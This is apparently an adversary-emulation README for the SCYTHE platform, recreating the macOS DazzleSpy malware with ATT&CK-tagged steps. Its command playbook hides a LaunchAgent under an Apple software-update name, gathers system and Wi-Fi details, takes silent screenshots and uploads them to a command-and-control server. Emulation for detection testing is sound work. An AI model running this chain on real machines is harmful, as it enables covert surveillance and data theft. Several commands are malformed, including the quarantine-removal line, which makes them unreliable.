##DazzleSpy 

This threat is based on the [WeLiveSecure](https://www.welivesecurity.com/2022/01/25/watering-hole-deploys-new-macos-malware-dazzlespy-asia/) threat report released on January 25,2022. 

# Dazzle Spy 
1. Download and import the threats in JSON format to your SCYTHE instace
2. Download the Virtual File System (VFS) files under DazzleSpy/VFS. 
3. Upload the VFS file to your SCYTHE VFS in the following location: VFS:/shared/threats/DazzleSpy
4. Create a new campaign DazzleSpy with HTTPS and the communication option. You can import the `config.json` or manually add 
`--cp yourdomain.com:443 --secure true --multipart 10240 --heartbeat 5 --jitter 10` 
5. Import Existing Threat: *DazzleSpy*
6. Start Campaign
7. Download Campaign Client
7. In ~/Downloads run `chmod +x *.osx` and then run `sudo xattr =r =d com.apple.quareantine *.osx`
8. `./*.osx`


### To Emulate: 
```bash
loader --load downloader 
downloader --src VFS:/shared/threats/DazzleSpy/com.apple.softwareupdate.plist --dest /tmp/com.apple.softwareupdate.plist
loader --unload downloader
loader --load run
run mv /tmp/com.apple.softwareupdate.plist ~/Library/LaunchAgents/com.apple.softwareupdate.plist
run launchctl load ~/Library/LaunchAgents/com.apple.softwareupdate.plist #T1569
run whoami #T1033
run ioreg -d2 -c IOPlatformExpertDevice | awk -F\" '/IOPlatformUUID/{print $(NF-1)}'
run ioreg -l | grep IOPlatformSerialNumber #T1082
run df -h  #T1082
run sw_vers # T1082
run date #T1124
run /System/Library/PrivateFrameworks/Apple80211.framework/Resources/airport -I | awk -F: '/ SSID/{print $2}' #T1016
run csrutil status #T1068
run id -G `whoami`
run ls -lah ~/Desktop ~/Documents ~/Downloads  #T1083
run ps aux # T1057
run screencapture -t png -x /tmp/monitor1.png /tmp/monitor2.png /tmp/monitor3.png /tmp/monitor4.png #T1113
loader --load uploader
uploader --remotepath /tmp/monitor1.png #T1041
uploader --remotepath /tmp/monitor2.png #T1041
uploader --remotepath /tmp/monitor3.png #T1041
uploader --remotepath /tmp/monitor4.png #T1041
loader --unload uploader
# Cleanup
run launchctl remove com.apple.softwareupdate
run rm ~/Library/LaunchAgents/com.apple.softwareupdate.plist
run rm /tmp/monitor*.png
loader --unload run
controller --shutdown
```


 #Attack Graph

```mermaid
graph TD
Step0["<b> module: https </b> <br>"]
Step1["<b> module: loader </b> <br><h4> parameters: </h4> <i> --load downloader </i> <br>"]
Step2["<b> module: downloader </b> <br><h4> parameters: </h4> <i> --src VFS:/shared/threats/DazzleSpy/com.apple.softwareupdate.plist --dest /tmp/com.apple.softwareupdate.plist </i> <br>"]
Step3["<b> module: loader </b> <br><h4> parameters: </h4> <i> --unload downloader </i> <br>"]
Step4["<b> module: loader </b> <br><h4> parameters: </h4> <i> --load run </i> <br><a href='https://attack.mitre.org/techniques/T1059.004'>att&ck-technique:T1059.004</a><br>
"]
Step5["<b> module: run </b> <br><h4> parameters: </h4> <i> mv /tmp/com.apple.softwareupdate.plist ~/Library/LaunchAgents/com.apple.softwareupdate.plist </i> <br>"]
Step6["<b> module: run </b> <br><h4> parameters: </h4> <i> launchctl load ~/Library/LaunchAgents/com.apple.softwareupdate.plist </i> <br><a href='https://attack.mitre.org/techniques/T1569'>att&ck-technique:T1569</a><br>
<a href='https://attack.mitre.org/techniques/T1569.001'>att&ck-technique:T1569.001</a><br>
"]
Step7["<b> module: run </b> <br><h4> parameters: </h4> <i> whoami </i> <br><a href='https://attack.mitre.org/techniques/T1033'>att&ck-technique:T1033</a><br>
"]
Step8["<b> module: run </b> <br><h4> parameters: </h4> <i> ioreg -d2 -c IOPlatformExpertDevice | awk -F\ /IOPlatformUUID/{print $(NF-1)} </i> <br><a href='https://attack.mitre.org/techniques/T1082'>att&ck-technique:T1082</a><br>
"]
Step9["<b> module: run </b> <br><h4> parameters: </h4> <i> ioreg -l | grep IOPlatformSerialNumber </i> <br><a href='https://attack.mitre.org/techniques/T1082'>att&ck-technique:T1082</a><br>
"]
Step10["<b> module: run </b> <br><h4> parameters: </h4> <i> df -h  </i> <br><a href='https://attack.mitre.org/techniques/T1082'>att&ck-technique:T1082</a><br>
"]
Step11["<b> module: run </b> <br><h4> parameters: </h4> <i> sw_vers </i> <br><a href='https://attack.mitre.org/techniques/T1082'>att&ck-technique:T1082</a><br>
"]
Step12["<b> module: run </b> <br><h4> parameters: </h4> <i> date </i> <br><a href='https://attack.mitre.org/techniques/T1124'>att&ck-technique:T1124</a><br>
"]
Step13["<b> module: run </b> <br><h4> parameters: </h4> <i> /System/Library/PrivateFrameworks/Apple80211.framework/Resources/airport -I | awk -F: / SSID/{print $2} </i> <br><a href='https://attack.mitre.org/techniques/T1016'>att&ck-technique:T1016</a><br>
"]
Step14["<b> module: run </b> <br><h4> parameters: </h4> <i> csrutil status </i> <br><a href='https://attack.mitre.org/techniques/T1068'>att&ck-technique:T1068</a><br>
"]
Step15["<b> module: run </b> <br><h4> parameters: </h4> <i> id -G `whoami` </i> <br><a href='https://attack.mitre.org/techniques/T1082'>att&ck-technique:T1082</a><br>
"]
Step16["<b> module: run </b> <br><h4> parameters: </h4> <i> ls -lah ~/Desktop ~/Documents ~/Downloads  </i> <br><a href='https://attack.mitre.org/techniques/T1083'>att&ck-technique:T1083</a><br>
"]
Step17["<b> module: run </b> <br><h4> parameters: </h4> <i> ps aux </i> <br><a href='https://attack.mitre.org/techniques/T1057'>att&ck-technique:T1057</a><br>
"]
Step18["<b> module: run </b> <br><h4> parameters: </h4> <i> screencapture -t png -x /tmp/monitor1.png /tmp/monitor2.png /tmp/monitor3.png /tmp/monitor4.png  </i> <br><a href='https://attack.mitre.org/techniques/T1113'>att&ck-technique:T1113</a><br>
"]
Step19["<b> module: loader </b> <br><h4> parameters: </h4> <i> --load uploader </i> <br><a href='https://attack.mitre.org/techniques/T1041'>att&ck-technique:T1041</a><br>
"]
Step20["<b> module: uploader </b> <br><h4> parameters: </h4> <i> --remotepath /tmp/monitor1.png </i> <br><a href='https://attack.mitre.org/techniques/T1041'>att&ck-technique:T1041</a><br>
"]
Step21["<b> module: uploader </b> <br><h4> parameters: </h4> <i> --remotepath /tmp/monitor2.png </i> <br><a href='https://attack.mitre.org/techniques/T1041'>att&ck-technique:T1041</a><br>
"]
Step22["<b> module: uploader </b> <br><h4> parameters: </h4> <i> --remotepath /tmp/monitor3.png </i> <br><a href='https://attack.mitre.org/techniques/T1041'>att&ck-technique:T1041</a><br>
"]
Step23["<b> module: uploader </b> <br><h4> parameters: </h4> <i> --remotepath /tmp/monitor4.png </i> <br><a href='https://attack.mitre.org/techniques/T1041'>att&ck-technique:T1041</a><br>
"]
Step24["<b> module: loader </b> <br><h4> parameters: </h4> <i> --unload uploader </i> <br>"]
Step25["<b> module: run </b> <br><h4> parameters: </h4> <i> launchctl remove com.apple.softwareupdate </i> <br>"]
Step26["<b> module: run </b> <br><h4> parameters: </h4> <i> rm ~/Library/LaunchAgents/com.apple.softwareupdate.plist </i> <br>"]
Step27["<b> module: run </b> <br><h4> parameters: </h4> <i> rm /tmp/monitor*.png </i> <br>"]
Step28["<b> module: loader </b> <br><h4> parameters: </h4> <i> --unload run </i> <br>"]
Step29["<b> module: controller </b> <br><h4> parameters: </h4> <i> --shutdown </i> <br>"]
Step0 --> Step1
Step1 --> Step2
Step2 --> Step3
Step3 --> Step4
Step4 --> Step5
Step5 --> Step6
Step6 --> Step7
Step7 --> Step8
Step8 --> Step9
Step9 --> Step10
Step10 --> Step11
Step11 --> Step12
Step12 --> Step13
Step13 --> Step14
Step14 --> Step15
Step15 --> Step16
Step16 --> Step17
Step17 --> Step18
Step18 --> Step19
Step19 --> Step20
Step20 --> Step21
Step21 --> Step22
Step22 --> Step23
Step23 --> Step24
Step24 --> Step25
Step25 --> Step26
Step26 --> Step27
Step27 --> Step28
Step28 --> Step29
Step29 --> Step30
```

